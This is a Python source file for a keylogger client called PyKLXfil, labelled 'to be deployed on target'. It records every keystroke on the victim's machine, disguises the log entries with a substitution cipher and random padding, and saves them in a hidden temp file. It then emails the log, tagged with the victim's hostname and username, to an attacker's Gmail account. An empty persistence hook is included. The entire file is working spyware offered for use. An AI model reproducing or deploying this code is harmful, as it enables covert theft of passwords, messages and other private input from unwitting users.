#PyKLXfil client to be deployed on target
#### CLIENT ####
# -*- coding: utf-8 -*-
#Auther: 2021, Mayed Alm
import os
import random
import yagmail
import logging
import tempfile
import threading
from time import sleep
from pynput.keyboard import Listener


class PyKLXfilClient_mail:
    
    
    banner = '''
    ______      _   __ _     __   __ __ _ _ 
    | ___ \    | | / /| |    \ \ / // _(_) |
    | |_/ /   _| |/ / | |     \ V /| |_ _| |
    |  __/ | | |    \ | |     /   \|  _| | |
    | |  | |_| | |\  \| |____/ /^\ \ | | | |
    \_|   \__, \_| \_/\_____/\/   \/_| |_|_|
           __/ |  id4rksid3               v1.0
          |___/                             
          
          '''    
    
    def __init__(self):
        self.Listener = Listener
        self.letters = "abcdefghijklmnopqrstuvwxyz" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        if os.name == 'nt':
            self.log = tempfile.gettempdir() + '\\'
            self.hostname_username = os.getenv('COMPUTERNAME', 'defaultValue')+','+os.getlogin()
        elif os.name == 'posix':
            self.log = tempfile.gettempdir() + '/'
            self.hostname_username = os.uname().nodename+','+os.getlogin()        
        self.file = self.log + "log"+str(random.randint(10000,99999))+".log"        
        logging.basicConfig(filename=self.file, level=logging.DEBUG, format='%(asctime)s: %(message)s')


    def persist():
        #persistence
        pass

    #function to perform basic substitution cipher
    def substitution(self, str):
        Table = str.maketrans("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijk\\lmnopqrstuvwxyz0123456789+/!@#$%^&*()-_=][.,'",\
                              "01234567ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuv\\wxyz/+89%^&*()$.,#@!-'[]=_")
        return str.translate(Table)

    #logging function
    def on_press(self, key):
        if str(key).startswith("Ke"): #detect if pressed key is special keyboard key
            logging.info(''.join(random.choice(self.letters) for i in range(10))+self.substitution(str(key)+''.join(random.choice(self.letters) for i in range(10))))
        else:
            logging.info(''.join(random.choice(self.letters) for i in range(10))+self.substitution(str(key)[1]+''.join(random.choice(self.letters) for i in range(10))))

    def routine(self):
        with open(self.file, "w") as f:
            f.write("") #clean the file
        size = os.path.getsize(self.file)
        sizeKB = size >> 10 # right shift by 10 to get size in KB
        while sizeKB < 15:
            size = os.path.getsize(self.file)
            sizeKB = size >> 10 # right shift by 10 to get size in KB
            if sizeKB > 5:
                try:
                    self.mail()
                except:
                    sleep(5)
                    continue
            else:
                sleep(5)

            
    def mail(self):
        ###Edit with your own gmail account and app password.###
        user = ''
        app_password = ''
        to = ''
        subject = self.hostname_username
        content = [self.log, self.file]     
        with yagmail.SMTP(user, app_password) as yag:
            yag.send(to, subject, content)
            self.routine()


    def main_threads(self):
        th = threading.Thread(target=self.routine)
        listener = self.Listener(on_press=self.on_press)
        th.daemon = True
        th.start()
        listener.start()
        try:
            while listener.is_alive() and th.is_alive():
                sleep(1)
        except KeyboardInterrupt:
            listener.stop()

if __name__ == '__main__':
    run = PyKLXfilClient_mail()
    run.main_threads()
